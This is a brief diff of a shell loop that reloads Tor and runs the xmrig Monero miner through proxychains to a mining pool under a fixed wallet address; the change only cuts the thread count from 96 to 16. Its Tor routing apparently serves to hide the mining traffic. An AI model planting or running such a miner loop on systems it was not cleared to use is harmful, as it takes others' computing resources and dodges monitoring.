@@ -3,5 +3,5 @@ while true
 do
   echo hello
   sudo service tor reload
-  proxychains ./xmrig --url pool.hashvault.pro:443 --user 42v6emcRLdNMyX6gahdssJD2Ppw26jKg7cfvtpihC7Tm8rneWUs8iPybXBmDa7r6pcbWoMB1S9DgqGbi5CX3NTLxLksMsqU --pass zo --keepalive --donate-level 1 --tls -t 96
+  proxychains ./xmrig --url pool.hashvault.pro:443 --user 42v6emcRLdNMyX6gahdssJD2Ppw26jKg7cfvtpihC7Tm8rneWUs8iPybXBmDa7r6pcbWoMB1S9DgqGbi5CX3NTLxLksMsqU --pass zo --keepalive --donate-level 1 --tls -t 16
 done
